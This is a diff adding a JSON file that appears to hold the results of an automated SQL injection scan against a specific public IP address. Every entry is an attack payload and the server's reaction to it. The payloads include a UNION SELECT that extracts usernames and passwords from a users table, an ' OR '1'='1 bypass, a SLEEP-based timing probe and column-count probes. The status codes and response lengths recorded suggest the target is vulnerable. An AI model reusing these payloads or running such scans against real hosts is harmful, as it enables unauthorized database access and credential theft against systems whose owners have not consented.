@@ -1,0 +1,137 @@
+[
+  {
+    "url": "http://52.247.225.51/?q=' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1296
+  },
+  {
+    "url": "http://52.247.225.51/?q=' OR '1'='1",
+    "param": "q",
+    "base_value": "",
+    "payload": "' OR '1'='1",
+    "type": "Length/Content change",
+    "status_code": 200,
+    "response_length": 20235
+  },
+  {
+    "url": "http://52.247.225.51/?q=1' AND SLEEP(4)--",
+    "param": "q",
+    "base_value": "",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1156
+  },
+  {
+    "url": "http://52.247.225.51/?q=' UNION SELECT NULL--",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1168
+  },
+  {
+    "url": "http://52.247.225.51/?q=' UNION SELECT 1,2,3,NULL,NULL--",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT 1,2,3,NULL,NULL--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1201
+  },
+  {
+    "url": "http://52.247.225.51/?q= ' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "param": "q",
+    "base_value": " ",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1298
+  },
+  {
+    "url": "http://52.247.225.51/?q= ' OR '1'='1",
+    "param": "q",
+    "base_value": " ",
+    "payload": "' OR '1'='1",
+    "type": "Length/Content change",
+    "status_code": 200,
+    "response_length": 11260
+  },
+  {
+    "url": "http://52.247.225.51/?q= 1' AND SLEEP(4)--",
+    "param": "q",
+    "base_value": " ",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1159
+  },
+  {
+    "url": "http://52.247.225.51/?q= ' UNION SELECT NULL--",
+    "param": "q",
+    "base_value": " ",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1171
+  },
+  {
+    "url": "http://52.247.225.51/?q= ' UNION SELECT 1,2,3,NULL,NULL--",
+    "param": "q",
+    "base_value": " ",
+    "payload": "' UNION SELECT 1,2,3,NULL,NULL--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1204
+  },
+  {
+    "url": "http://52.247.225.51/?q=a' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "param": "q",
+    "base_value": "a",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1298
+  },
+  {
+    "url": "http://52.247.225.51/?q=a' OR '1'='1",
+    "param": "q",
+    "base_value": "a",
+    "payload": "' OR '1'='1",
+    "type": "Length/Content change",
+    "status_code": 200,
+    "response_length": 12529
+  },
+  {
+    "url": "http://52.247.225.51/?q=a1' AND SLEEP(4)--",
+    "param": "q",
+    "base_value": "a",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1159
+  },
+  {
+    "url": "http://52.247.225.51/?q=a' UNION SELECT NULL--",
+    "param": "q",
+    "base_value": "a",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1171
+  },
+  {
+    "url": "http://52.247.225.51/?q=a' UNION SELECT 1,2,3,NULL,NULL--",
+    "param": "q",
+    "base_value": "a",
+    "payload": "' UNION SELECT 1,2,3,NULL,NULL--",
+    "type": "Status changed (200 \u2192 500)",
+    "status_code": 500,
+    "response_length": 1204
+  }
+]
